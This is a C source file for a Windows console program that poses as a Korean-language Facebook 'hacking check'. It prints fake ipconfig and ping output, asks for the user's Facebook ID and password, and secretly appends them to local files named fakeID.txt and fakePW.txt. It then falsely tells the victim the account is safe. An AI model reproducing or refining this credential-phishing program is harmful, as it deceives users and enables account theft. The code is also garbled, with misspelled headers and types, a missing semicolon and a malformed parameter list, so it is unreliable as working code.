#include "stdafx.h"
#include <window.h>
#include <conio.h>

#define WAIT 800

void title()
{
	system("cls");
	puts("");
	puts(">Security program for Facebook address\n\n");
	puts("페이스북 해킹 여부 확인 프로그램입니다.");
	puts("프로그램을 시작하려면 아무키나 눌러주세요.");
	puts("종료하고 싶으실 땐 Ctrl+C를 눌러주세요.");
	puts("");
	puts("");
	puts("press any key to continue.");
}

void before_perinfo()
{
	char status[30] = "";
	puts("");
	puts("현재 Facebook의 상태를 점검합니다.");
	puts("C:\\lee\\Project7> ipconfig\n\n");
	printf("."); Sleep(WAIT);
	printf("."); Sleep(WAIT);
	printf(". \n\n\n"); Sleep(WAIT); Sleep(WAIT);
	printf("Windows IP Configuration\n\n\n");
	printf("Ethernet adapter 121:\n\n");
	printf("	Connection-specific DNS Suffix	.	: \n");
	printf("	Link-local IPv6 Adress			: ab12::2c38:4555:7812:5d251d1\n");
	printf("	IPv4 Address				: 178.169.221.151\n")
		printf("	Subnet Mask				: 231.231.231.0\n");
	printf("	Default Gateway				: 178.169.221.1\n\n");
	printf("Tunnel adapter isatap. {A54A5D-76AD-Q7G5B-A4D5S2}\n\n");
	printf("."); Sleep(WAIT);
	printf("."); Sleep(WAIT);
	printf("."); Sleep(WAIT); Sleep(WAIT);
	printf("\n\n");

	puts("C:\\lee\\Project7> ping www.facebook.com");
	puts("");
	puts("Reply from 12.63.66.81: bytes=32 time=1ms TTL=93");
	puts("Reply from 12.63.66.81: bytes=32 time=1ms TTL=93");
	puts("Reply from 12.63.66.81: bytes=32 time=3ms TTL=93");
	puts("");
	puts("Ping statistic for 12.63.66.81:");
	puts("\tPackets: Sent = 3, Recieved = 3, Lost = 0 (0% loss)");
	puts("Approximate round trip times in milli-seconds:");
	puts("\tMinimum = 1ms, Maximum = 3ms, Average = 2ms");
	Sleep(WAIT); Sleep(WAIT); Sleep(WAIT);
	puts("Faceboof 서버와 연결되었습니다."); puts("");
}

void get_info(FILE * fpID, FILE, *fpPW, vhar*ID, char*PW)
{
	printf("ID와 PW정보를 통해 해킹 여부를 점검합니다.\n Id를 입력해주세요.\n\n");
	scanf_s("%s", ID);
	printf("\nPW를 입력해주세요.\n\n");
	scanf_s("%s", PW);

	fputs(ID, fpID);
	fputs(PW, fpPW);
	fputs("*", fpID);
	fputs("*", fpPW);
}

void fake_safety(char* ID, char* PW, int* exit_code)
{
	printf("\n\nChecking the safety of the address"); Sleep(WAIT);
	printf("."); Sleep(WAIT);
	printf("."); Sleep(WAIT);
	printf("."); Sleep(WAIT);
	printf("."); Sleep(WAIT);
	printf("\n\nID : %s \nPW : ***********(임의의 *로 표시)의 계정은 안전한 것으로 확인 되었습니다.\n", ID);
	printf("안심하시고 사용하셔도 됩니다.\n\n프로그램을 종료하려면 아무키나 눌러주세요.\n");
	printf("초기 화면으로 돌아가시려면 0을 입력해주세요.\n");
	printf("Press any key to quit.\n\n");
	scanf("%d", exit_code);
}
int main()
{
	int exit_code = 0;
	FILE* fpID, * fpPW;
	fpID = fopen("C:\\lee\\Project7\\fakeID.txt", "a+");
	fpPW = fopen("C:\\lee\\Project7\\fakePW.txt", "a+");
	char ID[30];
	char PW[20];

	while (!exit_code)
	{
		title();
		int continue_key = _getch();

		before_perinfo();

		get_info(fpID, fpPW, ID, PW);

		fake_safety(ID, PW, &exit_code);
	}
	fclose(fpID);
	fclose(fpPW);
}